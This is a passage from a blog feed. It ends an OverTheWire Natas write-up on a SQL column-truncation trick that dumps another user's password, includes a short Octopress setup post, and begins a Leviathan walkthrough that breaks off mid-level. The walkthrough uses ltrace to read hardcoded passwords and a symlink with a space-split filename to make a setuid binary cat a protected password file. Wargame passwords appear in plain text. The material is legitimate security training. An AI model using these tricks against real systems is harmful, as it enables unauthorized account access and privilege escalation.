</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Wrong password for user: &quot;</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//user doesn&#39;t exist</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">createUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">],</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">])){</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;User &quot;</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot; was created!&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Before digging in the code, I just tested the functionality of the login system..you can create a user and then view its username and password values. After logging in, you will see something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Welcome haxor!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; haxor [password] =&gt; doge ) </span></code></pre></td></tr></table></div></figure>


<p>I then tried to create a natas28 user to see what would happen&hellip;and surprise!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Wrong password for user: natas28</span></code></pre></td></tr></table></div></figure>


<p>This tells us that there is indeed such a user in the database and that our random password doesn&rsquo;t match the one stored in the database..so that&rsquo;s what we want to get! I&rsquo;ve tried some SQLi, but got nothing. So back to reading PHP code it is! (ugh)</p>

<ul>
<li><p><em>checkCredentials()</em> checks if the provided username and password (which are both escaped) exist in the table, returning True if they are</p></li>
<li><p><em>validUser()</em> checks if the username is already in the table</p></li>
<li><p><em>dumpData()</em> prints the data about the array containing the username and password as seen above in the log in message</p></li>
<li><p><em>createUser()</em> inserts a new username-password pair in the table</p></li>
</ul>


<p>The important part of the rest of the code is that it looks up the username in the table, creating it if it doesn&rsquo;t exist, and proceeding with the credentials check and data printing if it already exists. After reading about the functions in the PHP manual I still had no idea how to continue. At this point, noticing the flow of the code was helpful:</p>

<p>1) when giving a username that already exists, it continues to the credentials checking part</p>

<p>2) if credential check is successful, the welcome message and credentials data are printed (without any other action from the user)</p>

<p>Judging from the above lines of reasoning, I thought that the interesting function that I might need to check again is the <em>dumpData()</em> one (because it returns data from the database, so it&rsquo;s possible to find out about the natas18 user from it). Still no idea how to do that though, but another thing I noticed is how important the username is for the code: all the checks and actions revolve around it, and it was also possible to determine the existence of the natas18 user because of that. So, at this point, I thought the next part should be to convince the code to dump the data for natas18.</p>

<p>I next thought about creating a username of natas18 followed by many spaces, exceeding the 64 character limit. The code still returned wrong password, so all the spaces must be trimmed. I made a string in Python to check what really happens:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">user</span> <span class="o">=</span> <span class="s">&#39;natas28&#39;</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="s">&#39;end&#39;</span>
</span><span class='line'><span class="k">print</span> <span class="n">user</span>
</span><span class='line'><span class="s">&#39;natas28                                                                end&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And I stopped inputting a password, because the code created users irrespective if they had passwords, and I could log in as an existing user with a blank password, as can be seen from this test dummy:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome yo!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; yo [password] =&gt; ) </span></code></pre></td></tr></table></div></figure>


<p>Now I tried to create a user with that long string and yeah, the space is removed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User natas28 end was created!</span></code></pre></td></tr></table></div></figure>


<p>However, when next I tried to log in just as natas28 with no password, here is what awaited me!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome natas28!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; natas28 [password] =&gt; JWwR438wkgTsNKBbcJoowyysdM82YjeF ) </span></code></pre></td></tr></table></div></figure>


<p>Why was this possible? Remember the flow of the code when you try to log in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>validUser() 
</span><span class='line'>  if user exists, checkCredentials()
</span><span class='line'>      if yay here is your data
</span><span class='line'>      if nay wrong password message
</span><span class='line'>  else createUser()</span></code></pre></td></tr></table></div></figure>


<p>To confirm it, I used <a href="http://sqlfiddle.com/">sqlfiddle</a> to generate a database and queries that mimic the PHP code.</p>

<p>First, table creation:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="o">`</span><span class="n">users</span><span class="o">`</span> <span class="p">(</span>
</span><span class='line'>  <span class="o">`</span><span class="n">username</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="k">DEFAULT</span> <span class="k">NULL</span><span class="p">,</span>
</span><span class='line'>  <span class="o">`</span><span class="n">password</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="k">DEFAULT</span> <span class="k">NULL</span>
</span><span class='line'><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, inserting the natas28 user with the password (I used a dummy one but assume it&rsquo;s the one we&rsquo;re after):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">users</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">&#39;natas28&#39;</span><span class="p">,</span><span class="s1">&#39;omgpass&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next, the querying for the username as it happens in the validUser() function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;natas28&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the result:</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/sqlfiddle.png" title="sqlfiddle" alt="sqlfiddle"></p>

<p>When trying to insert the long string next I received a data truncation error because it was larger than the allowed 64 characters, so I manually adjusted it to natas28 + 57 spaces:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>'natas28                                                         '</span></code></pre></td></tr></table></div></figure>


<p>Then I added it to the table:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">users</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">&#39;natas28                                                         &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>And when querying the database both are returned (with the first being the original natas28 user):</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/sqlfiddle2.png" title="sqlfiddle2" alt="sqlfiddle2"></p>

<p>To summarize:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># with input of 'natas28                                                                end'
</span><span class='line'>validUser() 
</span><span class='line'>  long string is truncated to natas28 end, which doesn't exist in the table
</span><span class='line'>createUser()
</span><span class='line'>  # input becomes 'natas28                                                         '
</span><span class='line'>  the value that is inserted in the table is truncated to the max length, in this case natas28 + 57 spaces
</span><span class='line'># now check again with username of natas28 and no password
</span><span class='line'>validUser() 
</span><span class='line'>  username already exists, so checkCredentials()
</span><span class='line'>  with the space trimming, the code returns both the original and my inserted username, as seen on sqlfiddle (but due to the PHP code, we only get the first row, which is fine, because that's the one we care about</span></code></pre></td></tr></table></div></figure>


<p>Password is <code>JWwR438wkgTsNKBbcJoowyysdM82YjeF</code></p>

<h3>Level 28</h3>

<p>And it&rsquo;s finished for now! Awesome challenge!</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/gz.png" title="gz" alt="gz"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ___________________________________
</span><span class='line'>&lt; You will triumph over your enemy. &gt;
</span><span class='line'> -----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Cloning Octopress blog]]></title>
    <link href="http://chousensha.github.io/blog/2015/11/26/cloning-octopress-blog/"/>
    <updated>2015-11-26T11:16:32-05:00</updated>
    <id>http://chousensha.github.io/blog/2015/11/26/cloning-octopress-blog</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve recently had some problems with Octopress breaking on my old Kali 1.0 box. And since the Kali 1.0 reached its end of life, figured this might be a good time to jump ship and install the 2.0 version, and set up a fresh Octopress there. So in this post I will quickly overview the steps needed to clone an already existing Octopress blog on a new machine and resume blogging from there.</p>

<!-- more -->


<h4>clone the source branch repository</h4>

<p>git clone -b source <a href="https://github.com/chousensha/chousensha.github.io.git">https://github.com/chousensha/chousensha.github.io.git</a> octopress</p>

<p>cd octopress</p>

<h4>clone master branch to _deploy</h4>

<p>git clone <a href="https://github.com/chousensha/chousensha.github.io.git">https://github.com/chousensha/chousensha.github.io.git</a> _deploy</p>

<p>The <code>source</code> branch contains the source of your blog, while the content that you generate is in the <code>master</code> branch.</p>

<p>Before proceeding with installing dependencies, I followed the instructions on <a href="http://octopress.org/docs/setup/">http://octopress.org/docs/setup/</a> to install rvm, Ruby 1.9.3 and ExecJs:</p>

<h4>install rvm</h4>

<p>command curl -sSL <a href="https://rvm.io/mpapis.asc">https://rvm.io/mpapis.asc</a> | gpg2 &mdash;import &ndash;
curl -L <a href="https://get.rvm.io">https://get.rvm.io</a> | bash -s stable &mdash;ruby</p>

<h4>run below to be able to use rvm in the shell windows, and add it to your shell rc file or you will need to always run it before using rvm</h4>

<p>source /usr/local/rvm/scripts/rvm</p>

<h4>install Ruby 1.9.3</h4>

<p>rvm install 1.9.3</p>

<p>You will get a message that this version of Ruby is no longer maintained, but I had problems with Ruby 2~ so keeping this for Octopress.</p>

<h4>use Ruby 1.9.3</h4>

<p>rvm use 1.9.3</p>

<h4>update the rubygems to the latest available</h4>

<p>rvm rubygems latest</p>

<h4>optional: check that your Ruby version is the right one</h4>

<p>ruby &mdash;version</p>

<h4>install JS runtime for Ruby</h4>

<p>gem install execjs</p>

<h4>now install dependencies</h4>

<p>gem install bundler
bundle install</p>

<h4>setup github pages</h4>

<p>bundle exec rake setup_github_pages</p>

<p>And you&rsquo;re good to go!</p>

<p>Note for <em>zsh</em> users: because of the globbing of <em>zsh</em>, you will need to add <code>alias rake=&ldquo;noglob rake&rdquo;</code> to your .zshrc file or you will get a no matches found error. Or you can quote the arguments given to rake: <code>rake &ldquo;new_post[Whatever]&rdquo;</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Few things are harder to put up with  \
</span><span class='line'>| than the annoyance of a good example. |
</span><span class='line'>|                                       |
</span><span class='line'>| -- "Mark Twain, Pudd'nhead Wilson's   |
</span><span class='line'>\ Calendar"                             /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OverTheWire: Leviathan]]></title>
    <link href="http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan/"/>
    <updated>2015-07-30T10:01:22-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan</id>
    <content type="html"><![CDATA[<p>The next step in difficulty for the OverTheWire wargames is Leviathan. From the description:</p>

<blockquote><p>This wargame doesn&rsquo;t require any knowledge about programming &ndash; just a bit of common sense and some knowledge about basic *nix commands.</p></blockquote>

<p>Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on <strong>leviathan.labs.overthewire.org</strong> through SSH.</p>

<p>To login to the first level use:</p>

<p>Username: leviathan0</p>

<p>Password: leviathan0</p>

<p>Data for the levels can be found in the homedirectories.</p>

<!-- more -->


<h3>Level 0 &ndash;> Level 1</h3>

<p>There is no information about what you have to do for each level to progress, so you just have to look around.</p>

<p>If you do a <em>ls -la</em> in the home directory, you will see an interesting hidden directory owned by leviathan1:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan0@melinda:~$ ls -la
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x   3 root       root       4096 Nov 14  2014 .
</span><span class='line'>drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
</span><span class='line'>drwxr-x---   2 leviathan1 leviathan0 4096 Jul 17 16:44 .backup
</span><span class='line'>-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
</span><span class='line'>-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
</span><span class='line'>-rw-r--r--   1 root       root        675 Apr  9  2014 .profile</span></code></pre></td></tr></table></div></figure>


<p>Inside there is a bookmarks.html file with lots of links, so I tried grepping for the word password and wasn&rsquo;t disappointed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan0@melinda:~/.backup$ cat bookmarks.html  | grep password
</span><span class='line'>&lt;DT&gt;&lt;A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"&gt;password to leviathan1&lt;/A&gt;</span></code></pre></td></tr></table></div></figure>


<h3>Level 1 &ndash;> Level 2</h3>

<p>There is a setuid binary in the home folder that asks for a password. Running <em>strings</em> on it didn&rsquo;t reveal much, except that it uses <em>strcmp</em>..so it compares the input it receives with something..</p>

<p>I solved this by running <em>ltrace</em> on the binary. <em>ltrace</em> is a library call tracer:</p>

<blockquote><p>ltrace  is  a  program  that simply runs the specified command until it
exits.  It intercepts and records the dynamic library calls  which  are
called  by  the  executed process and the signals which are received by
 that process.  It can also intercept and print the  system  calls  executed by the program.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan1@melinda:~$ ltrace ./check
</span><span class='line'>__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 &lt;unfinished ...&gt;
</span><span class='line'>printf("password: ")                                                                        = 10
</span><span class='line'>getchar(0x8048680, 47, 0x804a000, 0x8048642password: abcd
</span><span class='line'>)                                                = 97
</span><span class='line'>getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 98
</span><span class='line'>getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 99
</span><span class='line'>strcmp("abc", "sex")                                                                        = -1
</span><span class='line'>puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
</span><span class='line'>)                                                        = 29
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>


<p>In the <em>ltrace</em> output you can actually see the password that your input is compared with. Give it to the program and you will get a shell as leviathan2:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan1@melinda:~$ ./check 
</span><span class='line'>password: sex
</span><span class='line'>$ whoami
</span><span class='line'>leviathan2</span></code></pre></td></tr></table></div></figure>


<p>As in the previous wargame, look in <em>/etc/</em> for the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /etc/leviathan_pass/leviathan2
</span><span class='line'>ougahZi8Ta</span></code></pre></td></tr></table></div></figure>


<h3>Level 2 &ndash;> Level 3</h3>

<p>In this level we have another setuid binary named printfile. If you try to read the password file for the next level you just get a message that you an&rsquo;t have that file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
</span><span class='line'>You cant have that file...</span></code></pre></td></tr></table></div></figure>


<p>Running <em>ltrace</em> again we see the <em>access</em> system call is being used:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3   
</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
</span><span class='line'>access("/etc/leviathan_pass/leviathan3", 4)                                                 = -1
</span><span class='line'>puts("You cant have that file..."You cant have that file...
</span><span class='line'>)                                                          = 27
</span><span class='line'>+++ exited (status 1) +++</span></code></pre></td></tr></table></div></figure>


<p>This is good news, because <em>access</em> is vulnerable to race conditions, as can be seen from its man page:</p>

<blockquote><p>access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.</p>

<p>The check is done using the calling process&rsquo;s real UID and GID,  rather than the effective IDs as is done when actually attempting an operation
(e.g., open(2)) on the file.  This allows set-user-ID programs to  easily determine the invoking user&rsquo;s authority.</p>

<p>Warning: Using access() to check if a user is authorized to, for  example, open a file before actually doing so using open(2) creates a security
hole, because the user  might  exploit  the  short  time  interval between  checking and opening the file to manipulate it. For this reason, the   > use of this system call should be avoided.</p></blockquote>

<p>A more detailed description from <a href="https://www.owasp.org/index.php/File_Access_Race_Condition:_TOCTOU">OWASP</a>:</p>

<blockquote><p>The window of time between when a file property is checked and when the file is used can be exploited to launch a privilege escalation attack.</p>

<p>File access race conditions, known as time-of-check, time-of-use (TOCTOU) race conditions, occur when:</p>

<p>The program checks a property of a file, referencing the file by name.
The program later performs a filesystem operation using the same filename and assumes that the previously-checked property still holds.</p></blockquote>

<p>The first thing I thought was to create a file and make it a symlink to the password file, but it didn&rsquo;t work. So I just made a random file for test purposes and used <em>ltrace</em> again to see what is happening when accessing it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/readme
</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd784, 0x8048600 &lt;unfinished ...&gt;
</span><span class='line'>access("/tmp/baka/readme", 4)                                                               = 0
</span><span class='line'>snprintf("/bin/cat /tmp/baka/readme", 511, "/bin/cat %s", "/tmp/baka/readme")               = 25
</span><span class='line'>system("/bin/cat /tmp/baka/readme"test
</span><span class='line'> &lt;no return ...&gt;
</span><span class='line'>--- SIGCHLD (Child exited) ---
</span><span class='line'>&lt;... system resumed&gt; )                                                                      = 0
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>


<p>I have to say, I used help for this one, because it wasn&rsquo;t clear to me on how to proceed (it&rsquo;s also where I got stuck when I first attempted this wargame). If <em>access</em> returns successfully, it will <em>cat</em> the file that was passed to it (and it&rsquo;s actually <em>snprintf</em> that does the <em>cat</em>. Remember from Bandit how <em>cat</em> won&rsquo;t print files with spaces in their names, unless the spaces are escaped or the filename is surrounded by quotes. I made a new dummy file with a space in its name:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:/tmp/baka$ cat space\ file 
</span><span class='line'>test
</span><span class='line'>leviathan2@melinda:/tmp/baka$ cat space file
</span><span class='line'>cat: space: No such file or directory
</span><span class='line'>cat: file: No such file or directory</span></code></pre></td></tr></table></div></figure>


<p>Now I ran <em>ltrace</em> again and tried to print this new file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/space\ file 
</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 &lt;unfinished ...&gt;
</span><span class='line'>access("/tmp/baka/space file", 4)                                                           = 0
</span><span class='line'>snprintf("/bin/cat /tmp/baka/space file", 511, "/bin/cat %s", "/tmp/baka/space file")       = 29
</span><span class='line'>system("/bin/cat /tmp/baka/space file"/bin/cat: /tmp/baka/space: No such file or directory
</span><span class='line'>/bin/cat: file: No such file or directory
</span><span class='line'> &lt;no return ...&gt;
</span><span class='line'>--- SIGCHLD (Child exited) ---
</span><span class='line'>&lt;... system resumed&gt; )                                                                      = 256
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>


<p>There is a discrepancy between <em>access</em>, which checks the path of the file, and what <em>cat</em> tries to print, two different files that don&rsquo;t exist, <em>space</em> and <em>file</em> (because the space isn&rsquo;t seen as part of the filename, but as a separator between arguments):</p>

<ul>
<li><p><em>cat</em> tries /tmp/baka/space</p></li>
<li><p><em>cat</em> tries file</p></li>
</ul>


<p>This is where the symbolic link exploitation part comes in place. It didn&rsquo;t work before, but if I now create a symlink to the password file and name it <em>space</em>, it will match the first half of the file that <em>cat</em> will try to print:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:/tmp/baka$ ls -l
</span><span class='line'>total 8
</span><span class='line'>-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 12:18 readme
</span><span class='line'>lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 31 15:45 space -&gt; /etc/leviathan_pass/leviathan3
</span><span class='line'>-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 15:01 space file</span></code></pre></td></tr></table></div></figure>


<p>And now I run <em>printfile</em> again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ./printfile /tmp/baka/'space file'
</span><span class='line'>Ahdiemoo1j
</span><span class='line'>/bin/cat: file: No such file or directory</span></code></pre></td></tr></table></div></figure>


<p>Yay! It worked! Because <em>cat</em> first tried to print <em>space</em>, it followed the symlink with the same name and printed the password!</p>

<h3>Level 3 &ndash;> Level 4</h3>

<p>And another setuid binary! Running <em>strings</em> on it revealed it&rsquo;s a program that gives you a shell if you enter the right password. Along with string names such as do_stuff, nothing and morenothing xD</p>

<p><em>ltrace</em> keeps helping a lot with these challenges:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan3@melinda:~$ ltrace ./level3 
</span><span class='line'>__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 &lt;unfinished ...&gt;
</span><span class='line'>strcmp("h0no33", "kakaka")                                                                  = -1
</span><span class='line'>printf("Enter the password&gt; ")                                                              = 20
</span><span class='line'>fgets(Enter the password&gt; huh
</span><span class='line'>"huh\n", 256, 0xf7fcac20)                                                             = 0xffffd58c
